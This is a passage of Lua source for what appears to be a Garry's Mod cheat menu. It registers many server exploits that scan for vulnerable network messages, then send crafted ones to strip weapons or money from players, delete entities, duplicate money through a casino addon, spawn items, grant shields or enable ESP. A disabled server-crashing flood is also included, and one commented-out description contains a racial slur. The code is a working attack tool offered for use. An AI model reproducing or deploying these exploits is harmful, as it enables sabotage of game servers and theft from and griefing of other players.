            KV.NetStart(sploit, "hcLog", true)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

--[[KV.AddExploit( "Server Crasher", {
    desc = "Fuel is flammable? Who knew!",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return KV.ValidNetString( "simfphys_gasspill" ) end,
    hooks = {
        Think = function(tbl, sploit)
            KV.NetStart( sploit, "simfphys_gasspill" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )]]
KV.AddExploit("Strip Weapons", {
    desc = "Strip weapons/money from everybody",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("drugseffect_remove") end,
    hooks = {
        Think = function(tbl, sploit)
            if tbl[1] == 1 then
                KV.NetStart(sploit, "drugseffect_remove")
                net.SendToServer()
            elseif tbl[1] == 2 then
                KV.NetStart(sploit, "drugs_money")
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Strip Weapons",
            args = {1},
        },
        {
            typ = "func",
            Name = "Strip Money",
            args = {2},
        },
    },
})

KV.AddExploit("Strip Weapons", {
    desc = "Prevent players from using their weapons",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("Cover_WheelU") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("stripper2_plyz", {})) do
                local weaps = v:GetWeapons()
                KV.NetStart(sploit, "Cover_WheelU") --Cover_WheelD works too
                net.WriteEntity(v)

                net.WriteTable({weaps[math.random(#weaps)], weaps[math.random(#weaps)]})

                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "stripper2_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Strip Weapons", {
    desc = "Prevent players from using their weapons",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("DCHOLDSTER") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("stripper3_plyz", {})) do
                if not IsValid(v) or not IsValid(v:GetActiveWeapon()) then continue end
                local weaps = v:GetWeapons()
                KV.NetStart(sploit, "DCHOLDSTER")
                net.WriteEntity(v:GetActiveWeapon())
                net.WriteString(weaps[math.random(#weaps)]:GetClass())
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "stripper3_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Strip Weapons", {
    desc = "Automatically prevent all mass shootings",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("STOOL_FISHSPOT_REMOVE") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("stripper4_plyz", {})) do
                if not IsValid(v) or not IsValid(v:GetActiveWeapon()) then continue end
                KV.NetStart(sploit, "STOOL_FISHSPOT_REMOVE")
                net.WriteEntity(v:GetActiveWeapon())
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "stripper4_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Strip Weapons", {
    desc = "Automatically enforce gun control laws",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("DestroyTable") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("stripper5_plyz", {})) do
                if not IsValid(v) or not IsValid(v:GetActiveWeapon()) then continue end
                KV.NetStart(sploit, "DestroyTable")
                net.WriteEntity(v:GetActiveWeapon())
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "stripper5_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("Strip Weapons", {
    desc = "Remove the guns from the hands of the criminals",
    severity = 90,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("AS_DoAttack") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(KV.GetStored("stripper6_plyz", {})) do
                if not IsValid(v) or not IsValid(v:GetActiveWeapon()) then continue end
                KV.NetStart(sploit, "AS_DoAttack")

                net.WriteTable({
                    Weapon = v:GetActiveWeapon():EntIndex(),
                    Target = 0
                })

                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "players",
            addr = "stripper6_plyz"
        },
        {
            typ = "bool",
        },
    },
})

KV.AddExploit("old pCasino exploit", {
    desc = "Get loads of money for old pCasino",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("casinokit_chipexchange") end,
    hooks = {
        Think = function(tbl, sploit)
            -- Locals
            local lp = LocalPlayer()
            local moneylog = lp:getDarkRPVar("money")
            --Buy chips
            net.Start("casinokit_chipexchange")
            net.WriteEntity(self)
            net.WriteString("darkrp")
            net.WriteBool(true)
            net.WriteUInt(lp:getDarkRPVar("money"), 32)
            net.SendToServer()

            --Sell chips
            timer.Simple(3, function()
                for i = 1, 5000 do
                    net.Start("casinokit_chipexchange")
                    net.WriteEntity(self)
                    net.WriteString("darkrp")
                    net.WriteBool(false)
                    net.WriteUInt(moneylog * 0.10, 32)
                    net.SendToServer()
                end
            end)
        end,
    },
    functions = {
        {
            typ = "bool",
            typ = "func"
        },
    },
})

--KV.AddExploit( "Entity Spawner", {
--    desc = "Does someone not know how to code???Probaly using something made by lord",
--    severity = 100,
--    bools = {enabled = false},
--    status = 1,
--    times_per_tick = 1,
--    vars = {},
--    scan = function() return KV.ValidNetString( "MiningSyst.CreateEnt" ) end,
--   hooks = {
--        Think = function(tbl, sploit)
--net.Start("MiningSyst.CreateEnt")
--net.WriteString(KV.GetStored("spawn_enti", "Entity Id"))
--net.SendToServer()
--    end,
--    },
--    functions = {
--        { typ = "string", Name = "Entity thing", default = "Entity Id", addr = "spawn_enti" },
--        { typ = "bool", },
--    },
--} )
KV.AddExploit("Keypad Hacker (Lazy so don't have number)", {
    desc = "Hehehe this might work lets find out",
    severity = 10,
    bools = {
        enabled = false
    },
    status = 4,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("usec_paid_door") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in pairs(ents.FindByClass("uni_keypad")) do
                net.Start("usec_paid_door")
                net.WriteEntity(v)
                net.WriteBool(true)
                net.SendToServer()
            end
        end,
    },
    functions = {
        {
            typ = "bool",
        },
    },
})

--KV.AddExploit( "Free money", {
--    desc = "Master got me working.-Yellow 2021 (max = 2147483648)",
--    severity = 85,
--    bools = {enabled = false},
--    status = 1,
--    times_per_tick = 1,
--    vars = {},
--    scan = function() return KV.ValidNetString( "MiningSyst.SetMoney" ) end,
--   hooks = {
--        Think = function(tbl, sploit)
--net.Start("MiningSyst.SetMoney")
--net.WriteInt( KV.GetStored( "money_m" ), 32 )
--net.WriteString(LocalPlayer():SteamID())
--net.SendToServer()
--    end,
--    },
--    functions = {
--        { typ = "float", Name = "Amount", min = 1, max = 2147483648, default = 1000, addr = "money_m" },
--        { typ = "bool", },
--    },
--} )
--KV.AddExploit( "Free money v2.0", {
--    desc = "nigger loser bitch ass server exploits :wink: (max = 2147483648)-Gmod issue",
--    severity = 100,
--    bools = {enabled = false},
--    status = 1,
--    times_per_tick = 1,
--    vars = {},
--    scan = function() return KV.ValidNetString( "Suit.Price" ) end,
--   hooks = {
--        Think = function(tbl, sploit)
--net.Start("Suit.Price")
--net.WriteInt( KV.GetStored( "money_mv2" ), 32 )
--net.WriteString(LocalPlayer():SteamID())
--net.SendToServer()
--    end,        
--    },
--    functions = {
--        { typ = "float", Name = "Bobux", min = 1, max = 2147483648, default = 1000, addr = "money_mv2" },
--        { typ = "bool", },
--    },
--} )
KV.AddExploit("Free shields ", {
    desc = "Free Shileds",
    severity = 100,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return KV.ValidNetString("BuyShields") end,
    hooks = {
        Think = function(tbl, sploit)
            net.Start("BuyShields")
            net.WriteEntity(LocalPlayer())
            net.WriteBit(KV.GetStored("shieldsnoclip!"), 32)
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "float",
            Name = "Shields",
            min = 1,
            max = (math.pow(2, 32) - 1) / 2,
            default = 5,
            addr = "shieldsnoclip!"
        },
        {
            typ = "func",
            Name = "Do it",
        },
    },
})

KV.AddExploit("Free ESP!!!!!", {
    desc = "Esp suit for the price of 0.99$!",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 4,
    times_per_tick = 1,
    vars = {},
    scan = function() return file.Exists("autorun/lords_suit_autorun.lua", "LUA") end,
    hooks = {
        Think = function(tbl, sploit)
            local ply = LocalPlayer()
            ply:SetNWBool("Lords:ESP", true)

            if ply:GetNWBool("Lords:ESP") then
                print("Free ESP Loaded Successfully")
            else
                print("Free ESP Failed To Loaded Successfully")
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Esp On!",
        },
    },
})

KV.AddExploit("Free ESP!!!!!Power down", {
    desc = "Esp suit for the price of 0.99$!",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 4,
    times_per_tick = 1,
    vars = {},
    scan = function() return file.Exists("autorun/lords_suit_autorun.lua", "LUA") end,
    hooks = {
        Think = function(tbl, sploit)
            local ply = LocalPlayer()
            ply:SetNWBool("Lords:ESP", false)

            if ply:GetNWBool("Lords:ESP") then
                MsgC(Color(255, 0, 0), "[Free ESP] ", Color(255, 50, 50), "Is on!")
            else
                MsgC(Color(255, 0, 0), "[Free ESP] ", Color(255, 50, 50), "Is off now!")
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Esp On!",
        },
    },
})

KV.AddExploit("Free ESP!!!!!#2", {
    desc = "Esp suit for the price of 0.69$!",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 4,
    times_per_tick = 1,
    vars = {},
    scan = function() return file.Exists("autorun/kaiser_suit_autorun_v2.lua", "LUA") end,
    hooks = {
        Think = function(tbl, sploit)
            local ply = LocalPlayer()
            ply:SetNWBool("K:ESP", true)

            if ply:GetNWBool("K:ESP") then
                print("Free ESP Loaded Successfully")
            else
                print("Free ESP Failed To Loaded Successfully")
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Esp On!",
        },
    },
})

KV.AddExploit("Turn Off Free ESP!!!!!#2", {
    desc = "Esp suit for the price of 0.69$ Power down!",
    severity = 50,
    bools = {
        enabled = false
    },
    status = 4,
    times_per_tick = 1,
    vars = {},
    scan = function() return file.Exists("autorun/kaiser_suit_autorun_v2.lua", "LUA") end,
    hooks = {
        Think = function(tbl, sploit)
            local ply = LocalPlayer()
            ply:SetNWBool("K:ESP", false)

            if ply:GetNWBool("K:ESP") then
                print("ESP Loaded Still On")
            else
                print("Free ESP Is Now in Brazil")
            end
        end,
    },
    functions = {
        {
            typ = "func",
            Name = "Esp Off!",
        },
    },
})

KV.AddExploit("Entity Spawner v2.1", {
    desc = "Does someone not know how to code???Probaly using something made by lord \nNow using a diffo dection way things v1 due to this way it might not work...",
    severity = 1,
    bools = {
        enabled = false
    },
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return file.Exists("autorun/sh_load_armor.lua", "LUA") end,
    hooks = {
        Think = function(tbl, sploit)
            net.Start("SuitsLoader.Base")
            net.WriteString(KV.GetStored("spawn_SUIT1", "Entity Id/suitsentity"))
            net.SendToServer()
        end,
    },
    functions = {
        {
            typ = "string",
            Name = "Entity/Suit",
            default = "Entity Id/suitsentity",
            addr = "spawn_SUIT1"
        },
        {
            typ = "bool",
        },
    },
})

KV.LNextNuke = {}

function KV.NukeWeapon(ent, sploit)
    if not ent:IsValid() then return end
    if KV.LNextNuke[ent] and KV.LNextNuke[ent] > SysTime() then return end
    KV.NetStart(sploit, "properties")
    net.WriteString("remove")
    net.WriteEntity(ent)
    net.SendToServer()
    KV.LNextNuke[ent] = SysTime() + 0.5
end

function KV.RemoveEnts(tab, sploit)
    for k, v in pairs(tab) do
        if not v:IsValid() then continue end
        if KV.LNextNuke[v] and KV.LNextNuke[v] > SysTime() then continue end
        KV.NetStart(sploit, "properties")
        net.WriteString("remove")
        net.WriteEntity(v)
        net.SendToServer()
    end
end

KV.OpenMenu(true)
